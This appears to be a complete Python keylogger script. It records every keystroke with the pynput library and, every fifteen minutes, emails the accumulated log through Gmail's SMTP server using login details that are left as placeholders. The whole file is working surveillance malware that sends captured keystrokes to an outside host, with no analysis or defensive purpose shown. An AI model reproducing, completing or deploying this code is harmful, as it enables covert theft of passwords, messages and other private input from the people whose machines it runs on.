import pynput.keyboard
import smtplib
import threading

log = ""

def lis(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " "+str(key)+" "
    except:
        pass


#To get the keys logs everything is sent through email, 587 is the port for gmail service I think
def SendEmail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def thread_func_wait():
    global log
    SendEmail("Email","Password", log)
    log = ""
    timer_obj = threading.Timer(900, thread_func_wait)
    timer_obj.start()

listener = pynput.keyboard.Listener(on_press=lis)

#threading
with listener:
    thread_func_wait()
    listener.join()
    
